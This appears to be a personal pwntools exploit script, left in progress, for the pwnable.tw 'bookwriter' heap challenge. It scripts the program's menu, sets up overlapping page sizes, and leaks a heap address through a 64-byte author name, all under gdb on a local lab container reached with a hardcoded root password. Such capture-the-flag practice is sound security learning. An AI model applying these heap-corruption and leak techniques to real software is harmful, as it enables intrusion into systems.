from pwn import *

context.log_level = 'debug'

def add(size, content):
    global p
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of page :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    p.sendline(content)

def view(index):
    global p
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index of page :')
    p.sendline(str(index))

def edit(index, content):
    global p
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index of page :')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.sendline(content)

def information(changeAuthor=False, authorName=None):
    global p
    p.recvuntil('Your choice :')
    p.sendline('4')
    info = p.recvuntil('(yes:1 / no:0)')
    if changeAuthor:
        p.sendline('1')
        p.recvuntil('Author :')
        p.sendline(authorName)
    else:
        p.sendline('0')
    return info

gdbscript = "break *0x00400cee\n" # after print menu
gdbscript += "conti\n"*11
gdbscript += "x/20xg 0x6020a0\n"

shell = ssh('root', '172.17.0.2', 22, password='iamroot')
p = gdb.debug('/home/ngoctin/ctf/Pwnable.tw/bookwriter/bookwriter', gdbscript=gdbscript, ssh=shell, env={'LD_PRELOAD': ''})

# p = gdb.debug('./bookwriter', gdbscript=gdbscript)

p.recvuntil('Author :')
p.sendline("A"*64)

add(0, '')
for i in range(1, 8):
    add(10, str(i)*10)
# add one more page to overwrite size of fisrt page
add(10, 'B'*10)

# leak heap address
info = information()
print(info)
info = info.split("\n")[0] # get author name
info = info.split("A"*64)[1] # leak heap address
leak_heap_addr = int(info[::-1].encode('hex'), 16)
print('heap:', hex(leak_heap_addr))


p.interactive()